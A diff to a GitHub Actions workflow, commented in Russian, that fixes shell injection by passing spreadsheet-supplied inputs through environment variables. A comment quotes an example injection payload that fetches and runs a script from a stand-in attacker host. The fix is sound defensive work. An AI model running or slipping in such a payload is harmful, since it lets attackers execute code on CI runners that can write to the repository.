@@ -79,6 +79,12 @@ jobs:
           cat "${FILE}"
 
       - name: Коммит
+        env:
+          # KIND задан как type: choice, но это ограничение только веб-формы
+          # GitHub. Apps Script дёргает REST API напрямую (POST .../dispatches),
+          # а API choice не валидирует — прилетит любая строка, которую Apps
+          # Script передал. Через env, не ${{ }} в run: — см. пояснение ниже.
+          KIND: ${{ inputs.kind }}
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
@@ -87,7 +93,7 @@ jobs:
             echo "нечего коммитить"
             exit 0
           fi
-          git commit -m "editor: запрос «${{ inputs.kind }}» из таблицы"
+          git commit -m "editor: запрос «${KIND}» из таблицы"
           for i in 1 2 3 4 5; do
             if git push origin HEAD:${{ github.ref_name }}; then
               echo "push ok (попытка $i)"
@@ -99,16 +105,28 @@ jobs:
 
       - name: Отчёт
         if: always()
+        # topic и who приходят из ячейки Google-таблицы и поля email — их
+        # редактирует человек с доступом к документу, не обязательно к
+        # репозиторию. ${{ inputs.topic }} прямо в run: — это подстановка
+        # текста в bash-скрипт ДО того, как его увидит shell: значение вроде
+        # `$(curl attacker/x|bash)` выполнилось бы на раннере с contents:
+        # write. env: работает иначе — GitHub кладёт значение в переменную
+        # окружения как инертную строку, shell её не интерпретирует.
+        env:
+          KIND: ${{ inputs.kind }}
+          TOPIC: ${{ inputs.topic }}
+          WHO: ${{ inputs.who }}
+          REC_FILE: ${{ steps.rec.outputs.file }}
         run: |
           {
             echo "## Запрос редактора принят"
             echo ""
             echo "| Поле | Значение |"
             echo "|---|---|"
-            echo "| Тип | ${{ inputs.kind }} |"
-            echo "| Тема | ${{ inputs.topic }} |"
-            echo "| Кто | ${{ inputs.who }} |"
-            echo "| Файл | \`${{ steps.rec.outputs.file }}\` |"
+            echo "| Тип | ${KIND} |"
+            echo "| Тема | ${TOPIC} |"
+            echo "| Кто | ${WHO} |"
+            echo "| Файл | \`${REC_FILE}\` |"
             echo ""
             echo "Разберёт рутина B (\`/cycle-listen\`) — очередь читается до обхода таблицы."
           } >> "$GITHUB_STEP_SUMMARY"
